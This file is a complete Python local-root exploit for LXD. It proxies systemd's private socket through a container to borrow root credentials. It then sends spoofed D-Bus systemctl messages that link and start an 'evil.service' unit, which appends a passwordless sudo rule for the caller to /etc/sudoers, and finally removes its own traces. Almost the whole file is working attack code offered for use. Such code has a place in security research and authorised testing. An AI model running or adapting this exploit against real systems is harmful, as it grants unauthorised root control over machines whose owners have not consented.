#!/usr/bin/env python3

"""
LXD local root exploit by initstring (github.com/initstring/lxd_root).

This takes advantage of the ability for any member of the local 'lxd' group
to proxy a UNIX socket from the host OS into a container. Communication to
the socket will leverage the credentials of the LXD service, as opposed to the
user or even the container. That service happens to be root.

If we can pretend to be root while talking to sockets, we can ask them to do
things that only root can do. For example, we can leverage the native systemd
private socket to imitate valid `systemctl` commands. This is what this exploit
does.

The crazy looking global variables are taken directly from the output of
`strace` being run on legitimate `systemctl` commands.

You need an existing container to run this and you need to be a member of the
`lxd` group, or have write access to the `lxd` UNIX socket.

Usage:
  $ lxd_rootv2.py <container name>

Enjoy!
"""

import getpass
import argparse
import time
import socket
import os

			#### BEGIN GLOBAL VARIBLES ####

BANNER = r'''
                    lxd_root (version 2)
//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/lxd_root   ||
\\=========[]==========================================//
'''

# We will use systemd's private socket.
SYSTEMD_SOCK = '/run/systemd/private'

# The first sendmsg to the socket must be a null byte and a friendly hello.
AUTH = u'\0AUTH EXTERNAL 30\r\nNEGOTIATE_UNIX_FD\r\nBEGIN\r\n'

# The individual messages for each systemctl command follow below.
# Unicode seems to work well for the code that goes to the socket.
# Sorry for breaking the 80-character barrier, RIP PEP8. :/
LINK = {'cmd_name': 'systemctl link /tmp/evil.service',
        'cmd_bytes': u'l\1\4\1$\0\0\0\1\0\0\0\242\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\r\0\0\0LinkUnitFiles\0\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\4asbb\0\0\0\0\0\0\0\26\0\0\0\21\0\0\0/tmp/evil.service\0\0\0\0\0\0\0\0\0\0\0'}

RELOAD = {'cmd_name': 'systemctl daemon-reload',
          'cmd_bytes': u'l\1\4\1\0\0\0\0\2\0\0\0\211\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\6\0\0\0Reload\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0'}

START = {'cmd_name': 'systemctl start evil.service',
         'cmd_bytes': u'l\1\4\1 \0\0\0\1\0\0\0\240\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\t\0\0\0StartUnit\0\0\0\0\0\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\2ss\0\f\0\0\0evil.service\0\0\0\0\7\0\0\0replace\0'}

DISABLE = {'cmd_name': 'systemctl disable evil.service',
           'cmd_bytes': u'l\1\4\1\34\0\0\0\1\0\0\0\251\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\20\0\0\0DisableUnitFiles\0\0\0\0\0\0\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\3asb\0\0\0\0\0\0\0\0\21\0\0\0\f\0\0\0evil.service\0\0\0\0\0\0\0\0'}

			 #### END GLOBAL VARIABLES ####

def process_args():
    """Handles user-passed parameters"""
    parser = argparse.ArgumentParser()
    parser.add_argument('container', type=str, action='store',
                        help='The name of an existing container.')
    parser.add_argument('--debug', '-d', action='store_true',
                        help='Print out raw socket replies.')

    args = parser.parse_args()

    return args


def write_svc_file():
    """
    Writes a temporary systemd unit file, which will later be imported.

    For custom payloads, edit the 'ExecStart' section. Currently, it grants
    the calling user the permission to execute sudo commands with no password.
    """
    svc_file = '/tmp/evil.service'
    user_name = getpass.getuser()
    svc_content = ('[Unit]\n'
                   'Description=evil service\n'
                   '[Service]\n'
                   'Type=oneshot\n'
                   'ExecStart=/bin/sh -c "echo {} ALL=\(ALL\) NOPASSWD: ALL'
                   '>> /etc/sudoers"\n'
                   '[Install]\n'
                   'WantedBy=multi-user.target\n'.format(user_name))
    with open(svc_file, 'w') as file_handler:
        file_handler.write(svc_content)


def socket_voodoo(container):
    """
    Abuses LXD's trusting nature to spoof root credentials to a socket.

    First, we connect to the private systemd socket on the host and proxy it
    into the container. Then, we proxy that back out to the host so that
    this Python script can interact with it. At that point, we are using root's
    peercreds instead of our own.
    """
    # Define the final socket we will talk directly to
    host_sock = '/tmp/lxd/host_sock'

    # Define the intermediary socket that will sit in the container
    container_sock = '/tmp/container_sock'

    # Start the container
    print("[+] Starting container {}".format(container))
    os.system('lxc start {}'.format(container))

    # First, map the host systemd socket into the container as root.
    print("[+] Proxying the systemd socket into the container")
    os.system('''lxc config device add {} container_sock proxy \\
                 connect=unix:{} listen=unix:{} \\
                 bind=container mode=0777'''.format(container, SYSTEMD_SOCK,
                                                    container_sock))

    # Then, map it back to the host so we can access it here.
    print("[+] Proxying it back out to the host")
    os.system('''lxc config device add {} host_sock proxy \\
                 connect=unix:/tmp/container_sock \\
                 listen=unix:{} bind=host \\
                 mode=0777'''.format(container, host_sock))

    return host_sock


def send_msg(msg, sock_name, debug):
    """
    Spoofs systemctl commands directly to a UNIX socket.

    This would not work without root credentials, which we steal from the
    LXD proxy device.
    """
    # Connect to the systemd socket
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.connect(sock_name)

    # Always send the AUTH message first
    client_sock.sendall(AUTH.encode('latin-1'))

    # Debugging - see raw socket replies
    reply = client_sock.recv(8192).decode("latin-1")
    if debug and reply:
        print(reply)

    # Then send the spoofed command
    client_sock.sendall(msg.encode('latin-1'))

    # Debugging - see raw socket replies
    reply = client_sock.recv(8192).decode("latin-1")
    if debug and reply:
        print(reply)


def cleanup(container):
    """
    Removes proxy devices from container and cleans up temp files.
    """
    print("[+] Cleaning up some temporary files")
    os.system('lxc config device remove {} host_sock'.format(container))
    os.system('lxc config device remove {} container_sock'.format(container))
    os.system('rm -rf /tmp/evil.service /tmp/lxd')


def main():
    """
    Main program function.
    """
    # Grab the arguments
    args = process_args()

    print(BANNER)

    # Make a temp directory that we have write access to, so we can clean
    # up at the end
    os.system('mkdir /tmp/lxd')

    # Write a systemd unit file
    write_svc_file()

    # Tunnel through some socket magic
    tunnel_sock = socket_voodoo(args.container)

    # Speak raw systemd language with our spoofed root
    for msg in [LINK, RELOAD, START, DISABLE]:
        print("[+] Sending command: {}".format(msg['cmd_name']))
        send_msg(msg['cmd_bytes'], tunnel_sock, args.debug)
        time.sleep(1)

    # Remove the devices from the container
    cleanup(args.container)

    # Celebrate!
    print("[+] All done! Enjoy your new sudo super powers")


if __name__ == '__main__':
    main()
